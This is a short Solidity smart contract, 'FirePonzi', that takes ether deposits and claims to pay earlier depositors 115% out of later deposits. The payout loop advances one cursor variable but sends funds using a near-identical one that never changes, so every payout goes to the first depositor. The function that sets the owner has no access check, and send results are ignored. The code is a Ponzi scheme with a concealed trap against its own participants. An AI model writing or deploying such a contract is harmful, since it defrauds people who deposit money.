 

contract FirePonzi {
    
    
   
  struct Player {
      address etherAddress;
      uint deposit;
  }

  Player[] public persons;

  uint public payoutCursor_Id_ = 0;
  uint public balance = 0;

  address public owner;


  uint public payoutCursor_Id=0;
  modifier onlyowner { if (msg.sender == owner) _ }
  function quick() {
    owner = msg.sender;
  }

  function() {
    enter();
  }
  function enter() {
    if (msg.value < 100 finney) {  
        msg.sender.send(msg.value);
        return;
    }
	
	uint deposited_value;
	if (msg.value > 2 ether) {  
		msg.sender.send(msg.value - 2 ether);	
		deposited_value = 2 ether;
    }
	else {
		deposited_value = msg.value;
	}


    uint new_id = persons.length;
    persons.length += 1;
    persons[new_id].etherAddress = msg.sender;
    persons[new_id].deposit = deposited_value;
 
    balance += deposited_value;
    


    while (balance > persons[payoutCursor_Id_].deposit / 100 * 115) {
      uint MultipliedPayout = persons[payoutCursor_Id_].deposit / 100 * 115;
      persons[payoutCursor_Id].etherAddress.send(MultipliedPayout);

      balance -= MultipliedPayout;
      payoutCursor_Id_++;
    }
  }


  function setOwner(address _owner) onlyowner {
      owner = _owner;
  }
}